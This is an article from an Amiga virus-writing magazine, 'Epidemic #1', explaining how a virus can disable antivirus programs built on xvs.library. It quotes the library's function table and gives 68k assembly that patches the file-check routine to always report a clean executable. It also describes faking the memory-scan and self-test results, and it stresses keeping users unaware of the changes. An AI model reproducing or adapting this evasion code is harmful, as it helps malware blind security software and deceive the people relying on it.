---------------
* Epidemic #1 *
---------------


         Retro techniques (anti-antiviruses).

There are some antiviruses on Amiga computer, most of them make use of 'xvs.library'
to check a memory for a virus, find them in files or to heal infected files. Such
an universal library has both advantages and disadvantages. The good side of it is,
that once we have an antivirus, we don't have to upgrade to any newer version, but
just update the library. Moreover, an antivirus programmer doesn't have to worry about
things connected with removing a virus from system, since when it is found, the library
would do everything. Also in case of different antivirus programs programmers don't have
to spend a lot of time writing procedures which would remove a virus from memory or file.
However, basing on this information that this is just a single file, we can disable
the library with just a few tricks.. To understand what we have to do let's take a look
on how it is built.

'xvs.library' consists of some functions, some of them would be rather useless
for us, we just have to take care of procedures which perform memory check, heal
files and the third one which checks library integrity.

Functions:

   IFND  LIBRARIES_XVS_LIB_I
LIBRARIES_XVS_LIB_I  SET   1

**
** $VER: xvs_lib.i 33.1 (30.12.97)
**
** Copyright © 1997 by Georg Hörmann
** All Rights Reserved
**

   IFND EXEC_LIBRARIES_I
   include "exec/libraries.i"
   ENDC

;======================================================================
; LVO Definitions
;======================================================================

   LIBINIT
   LIBDEF   _LVOxvsSelfTest
   LIBDEF   _LVOxvsCreateVirusList
   LIBDEF   _LVOxvsFreeVirusList
   LIBDEF   _LVOxvsAllocObject
   LIBDEF   _LVOxvsFreeObject
   LIBDEF   _LVOxvsObjectType
   LIBDEF   _LVOxvsCheckBootblock
   LIBDEF   _LVOxvsInstallBootblock
   LIBDEF   _LVOxvsSumBootblock
   LIBDEF   _LVOxvsCheckSector
   LIBDEF   _LVOxvsRepairSector
   LIBDEF   _LVOxvsCheckFile
   LIBDEF   _LVOxvsRepairFile
   LIBDEF   _LVOxvsSurveyMemory

   ENDC  ; LIBRARIES_XVS_LIB_I


1. File scanning:
Here we're interested in _LVOxvsCheckFile function. In 'xvs.doc' file we may
read that the only parameter is _xvsFileInfo structure. It contains
informations about file to be scanned. Currently we're interested only in
function's results.
Depending on file the result may be:

XVSFT_EMPTYFILE      equ   1  ; Empty file
XVSFT_DATAFILE       equ   2  ; Data file
XVSFT_EXEFILE        equ   3  ; Executable file
XVSFT_DATAVIRUS      equ   4  ; xvsfi_Name = virus name
XVSFT_FILEVIRUS      equ   5  ; xvsfi_Name = virus name
XVSFT_LINKVIRUS      equ   6  ; xvsfi_Name = virus name

so, if file contains any linkvirus, function would return with D0 set to 6.
If we check a file which wasn't infected, the library would return with "3",
so we can do something like:

   move.l   4.w,a6
   lea      xvs_name(pc),a1
   moveq    #33,d0
   jsr      -552(a6) ;_LV0_OpenLibrary
   beq.s    _end
   move.l   d0,a0
   move.l   -94(a0),a0  ;adres funkcji _LV0xvsCheckFile
   move.l   _new_CheckFile(pc),(a0) ;store new procedure
            ;over the original code. It makes it more difficult
            ;to restore original address from before infection.
   rts 


_new_CheckFile
   moveq #XVSFT_EXEFILE,d0 ;result = original procedure
   rts            ;it will NEVER find ANY virus
               ;in ANY file, since it will never be
               ;executed

It can be done different way, it just depends on You.

2. Memory scan.
Similarly as above, we're just interested in result, but this time
_LVOxvsSurveyMemory. Result: D0 - number of detected viruses in system.
Of course - result has to be 0 :), we do the same as before.

3. To make everything work, we have to switch off self-integrity-check, that is
_LVOxvsSelfTest function. When everything is ok, result is -1.

When it comes to the programs themselves, we have to work a little bit more to
make them harmless for us. It has to be done that way that the user thinks that
no changes have been made, thus it has to be done carefully.


MaD roGEr
